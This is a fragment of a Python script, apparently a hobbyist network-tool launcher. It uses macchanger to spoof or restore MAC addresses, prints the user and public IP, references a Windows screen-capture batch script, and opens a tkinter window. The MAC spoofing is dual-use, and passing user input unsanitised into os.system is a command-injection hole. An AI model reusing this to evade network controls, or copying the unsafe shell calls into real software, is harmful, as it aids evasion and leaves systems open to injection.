				print('done restarting network-mangaer')
				os.system('macchanger -s '+macchanger_interface_input)
				break
			elif macchanger_input1 == 3: ###REFURBISH
				print('macchanger -permanent '+macchanger_interface_input)
				os.system('ifconfig '+macchanger_interface_input+' down')
				os.system('macchanger -p '+macchanger_interface_input)
				os.system('ifconfig '+macchanger_interface_input+' up')
				break
			elif macchanger_input1 == 4:
				os.system('ifconfig '+macchanger_interface_input+' down')
				os.system('sudo macchanger-gtk')
				print('MUST SHUTDOWN MACCHANGER-GTK FOR COMMAND TO GO INTO EXECUTION')
				os.system('ifconfig '+macchanger_interface_input+' up')
				break
			else:
				print('[-] ERROR : wrong input, try again')
		os.system('ifconfig '+macchanger_interface_input+' up')
		print('---code finished---')

####################################################################################
####################################################################################
####################################################################################
	def new(self):
		return 0

####################################################################################
####################################################################################
####################################################################################

'''
WINDOWS SCREEN CAPTURE BATCH FILE
https://github.com/npocmaka/batch.scripts/blob/master/hybrids/.net/c/screenCapture.bat
C:UsersJohn DoeDesktop> call screenCapture screen.png

'''

####################################################################################
####################################################################################
####################################################################################

os.system('clear')
try:
	public_ip = str(subprocess.check_output(['dig', '+short', 'myip.opendns.com', '@resolver1.opendns.com']))[2:-3]
	print('CURRENT TIME : '+str(datetime.now())+'\nUSER  : '+str(subprocess.check_output('whoami'))[2:-3]+'\nPUBLIC IP : '+public_ip)
except:
	os.system('clear')
	print('CURRENT TIME : '+str(datetime.now())+'\nUSER  : '+str(subprocess.check_output('whoami'))[2:-3]+'\nPUBLIC IP : [!] UNAVILABLE ')

print("                                             .mh.                         ")
print("                                            `hMMy`                        ")
print("                                           sMshNo                         ")
print("                                         / +Mh``mN+.-                     ")
print("                                         /:Nd`  .NNo                      ")
print("                                         /Nm-:sy:/Nh                      ")
print("                                        `hMhhs::shmMo                     ")
print("                                       .sMh/.    `/hMo.                   ")
print("                                    `:ymMo          yMmy/`                ")
print("                                 `-ohssMy           `dN+shs-`             ")
print("                               .+yy/`-Nd`     .:     .mm``/yh+.           ")
print("                            `:yh+.  .mm.     .mN:     -Nh`  .+hy/`        ")
print("                         `-shs-    `dN-     .mMMN:     /Ms     -ohs-`     ")
print("                       `+hy/`      yM:     .mMMMMN:     oM+      `:yho`   ")
print("                       `ms        oM+     `dMMMMMMN-     yM:        oN.   ")
print("                        :M-      /Ms   ``.dMMMMMMMMN-``  `dN-      .N+    ")
print("                         yd   :/+NMyhdmNMMMMMMMMMMMMMMNmdhhMm+/:`  hd     ")
print("                         `N+  .hMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMd:  /M.     ")
print("                          +N. `mNyMMMMMMMMMMMMMMMMMMMMMMMMMMdMy  `No      ")
print("                           hh hM- .sMMMMMMMMMMMMMMMMMMMMMMd: +Mo ym       ")
print("                           .NdM/    .sMMMMMMMMMMMMMMMMMMd:    sMsM-       ")
print("                            yMs       hMMMMMMMMMMMMMMMMN`      hMy        ")
print("                           :MNy      `NMMMMMMMMMMMMMMMMM:      sMN.       ")
print("                          -Nd:M:     /MMMMMMMMMMMMMMMMMMy     -N+mm`      ")
print("                       :ddhhhhhhddNddmdddddddddddddddddddddNddhhhhhhdd-   ")
print("                         `mm. sm`    hMMMMMMNho+ymMMMMMMN     dy -Nh`     ")
print("                        `hN-  `ms   `NMMMds/.`   `-ohNMMM:   +N.  /Ms     ")
print("                        yM+....oM/::oMNy+/:::::::::::/sdMh:::Ns....sM+    ")

nkb = Tk() #  create tkinter canvas
my_gui = prog_nkb(nkb) # framework for tkinter

w = 280
h = 300
ws = nkb.winfo_screenwidth()
hs = nkb.winfo_screenheight()
x = (ws/2) - (w/2)
y = (hs/2) - (h/2)
nkb.geometry('%dx%d+%d+%d' % (w,h,x,y))
time.sleep(0.35)
nkb.mainloop()

